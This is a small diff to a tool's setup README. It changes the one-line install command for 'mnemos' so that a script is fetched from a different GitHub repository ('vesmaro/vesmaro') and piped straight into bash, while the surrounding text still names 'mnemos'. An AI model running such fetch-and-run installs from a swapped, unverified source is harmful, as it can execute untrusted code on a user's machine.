@@ -7,7 +7,7 @@ harness-agnostic: wherever your tool reads server configs from, the entry
 below is the whole contract. Target size: one screen; keep it that way.
 
 Prerequisite: `mnemos` on `PATH` (one-line install):
-`curl -fsSL https://raw.githubusercontent.com/Korrnals/mnemos/main/scripts/install.sh | bash`
+`curl -fsSL https://raw.githubusercontent.com/vesmaro/vesmaro/main/scripts/install.sh | bash`
 
 ## 1 · Connect — point your harness at the server
 
